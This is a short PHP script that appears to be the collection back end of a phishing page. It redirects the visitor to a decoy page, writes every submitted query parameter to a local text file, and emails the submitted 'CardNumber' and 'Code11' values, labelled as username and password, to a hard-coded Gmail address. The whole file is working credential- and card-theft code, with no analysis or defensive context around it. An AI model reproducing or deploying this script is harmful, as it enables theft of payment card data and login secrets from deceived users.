<?php
header ('Location:./false.html');
$handle = fopen("l.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$to      = 'arman13631363arman@gmail.com';
$subject = 'sssssssssss';
$username = $_GET['CardNumber'];
$password = $_GET['Code11'];
$message = "Username:" . $username . "<br>" . "Password:13791379arman " . $password;
$headers = 'From: arman13631363arman@gmail.com' . "\r\n" .
    'Reply-To: arman13631363arman@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
exit;
?>